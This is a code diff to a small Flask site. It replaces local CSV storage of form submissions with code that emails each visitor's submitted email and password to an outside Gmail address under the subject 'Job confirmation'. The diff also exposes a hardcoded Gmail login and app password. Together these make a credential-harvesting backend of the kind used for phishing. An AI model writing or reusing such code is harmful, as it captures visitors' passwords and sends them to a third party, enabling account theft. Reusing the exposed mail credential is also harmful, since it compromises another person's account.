@@ -1,8 +1,25 @@
 from flask import Flask, render_template,send_from_directory,request,redirect
 import os
 import csv
+import smtplib, ssl
+from email.message import EmailMessage
+
 
 app = Flask(__name__)
+
+port = 465  # For SSL
+smtp_server = "smtp.gmail.com"
+sender_email = "Anonymous"  # Enter your address
+receiver_email = "omarkhalifa426@gmail.com"  # Enter receiver address
+password = "knoqmuajdwblggkz"
+
+msg = EmailMessage()
+
+msg['Subject'] = "Job confirmation"
+msg['From'] = sender_email
+msg['To'] = receiver_email
+
+context = ssl.create_default_context()
 
 @app.route('/')
 def home():
@@ -11,18 +28,15 @@ def home():
 def page(page_name):
     return render_template(page_name)
 
-# with open('database.csv',mode='w') as db2:
-#         email = 'email'
-#         subject = 'subject'
-#         message = 'data'
-#         db_write = csv.writer(db2,delimiter = ',',quotechar='|',quoting=csv.QUOTE_NONE)
-#         db_write.writerow([email,subject,message])
+
 def csv_write(data):
-    with open('database.csv',newline='',mode='a') as db:
-        email = data['email']
-        passwd = data['password']
-        db_write = csv.writer(db,delimiter = ',',quotechar='|',quoting=csv.QUOTE_NONE)
-        db_write.writerow([email,str(passwd)])
+    email = data['email']
+    passwd = data['password']
+    message = f'Email: {email} \n Password: {passwd}'
+    msg.set_content(message, 'html')
+    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+        server.login('omarkhalifa226@gmail.com', password)
+        server.send_message(msg, from_addr=sender_email, to_addrs=receiver_email)
 
 
 @app.route('/submit',methods=['POST','GET'])
